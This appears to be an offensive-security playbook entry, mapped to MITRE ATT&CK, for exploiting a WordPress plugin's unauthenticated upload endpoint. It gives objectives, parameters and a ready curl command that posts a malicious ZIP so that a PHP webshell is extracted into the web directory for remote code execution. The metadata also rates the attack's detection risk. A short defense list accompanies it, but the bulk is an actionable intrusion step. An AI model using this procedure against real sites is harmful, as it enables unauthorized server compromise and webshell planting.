---
tags:
  - upload
  - curl
  - wordpress
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-upload-zip-to-articulate]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:23:19.971Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b16b01c3-2ddb-49ba-a949-2c1b74d1d5c9
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-ZIP-to-Vulnerable-Endpoint

## Summary

This procedure uses curl to POST the malicious ZIP to the plugin's /wp-json/articulate/v1/upload-data endpoint, exploiting lack of file validation to extract the PHP webshell.

## Description

The endpoint handles multipart uploads with chunk parameters, allowing arbitrary ZIPs. Random values for chunk and chunks simulate chunked uploads. No auth needed. Expected outcome: ZIP uploaded and extracted to /wp-content/uploads/articulate_uploads/, enabling access to index.php.

## Requirements

1. Network access to target WordPress site
2. Local malicious.zip file
3. curl installed

## Defense

Defensive measures and detection strategies:

- Input validation on upload endpoints: Reject non-Articulate ZIPs
- Rate limiting on JSON endpoints
- Audit logs for uploads to /wp-json/articulate/ and alert on ZIPs
- Plugin updates or removal

## Objectives

1. Bypass upload validation
2. Trigger extraction to web directory
3. Confirm placement for RCE

## Instructions

### Step 1: Prepare Upload Parameters

**Context**: Set random chunk values to mimic legitimate uploads.

**Command** (No command, manual: Choose random e.g., chunk=0, chunks=1).

> Expected output: Parameters ready.

### Step 2: Execute Upload

**Context**: POST ZIP using multipart form data.

**Command** ([[commands/curl-upload-zip-to-articulate]]):
```bash
curl http://target.com/wp-json/articulate/v1/upload-data -F "name=malicious.zip" -F "chunk=0" -F "chunks=1" -F "file=@malicious.zip"
```

> Expected output: JSON response with "Reading upload complete" or success indicator.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-zip-to-articulate]]

## Tools Used

- [[tools/curl]]

## Tags

- upload
- curl
- wordpress
